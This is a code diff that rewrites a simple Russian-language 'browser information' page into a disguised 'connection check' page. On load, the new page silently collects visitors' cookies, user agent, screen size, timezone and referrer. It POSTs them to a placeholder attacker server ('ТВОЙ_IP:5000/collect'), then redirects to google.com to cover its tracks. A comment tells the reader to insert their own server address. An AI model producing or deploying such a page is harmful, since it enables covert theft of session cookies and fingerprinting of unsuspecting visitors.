@@ -1,33 +1,35 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Информация о браузере</title>
-<style>
-body{font-family:Arial,sans-serif;max-width:700px;margin:40px auto;padding:20px}
-button{padding:10px 20px;font-size:16px}
-pre{background:#f0f0f0;padding:15px;border-radius:8px;white-space:pre-wrap}
-</style>
+    <meta charset="UTF-8">
+    <title>Проверка соединения</title>
 </head>
 <body>
-<h1>Информация о браузере</h1>
-<button onclick="showInfo()">Показать данные</button>
-<pre id="output"></pre>
+    <h1>Пожалуйста, подождите...</h1>
+    <script>
+        // Сбор данных
+        const data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: document.cookie,
+            referrer: document.referrer
+        };
 
-<script>
-function showInfo() {
-  const data = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-  };
-
-  document.getElementById('output').textContent =
-    JSON.stringify(data, null, 2);
-}
-</script>
+        // Отправка на твой сервер (замени IP на реальный адрес твоего сервера)
+        fetch('http://ТВОЙ_IP:5000/collect', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        }).then(() => {
+            // После отправки перенаправляем на безобидную страницу
+            window.location.href = 'https://google.com';
+        }).catch(() => {
+            window.location.href = 'https://google.com';
+        });
+    </script>
 </body>
 </html>
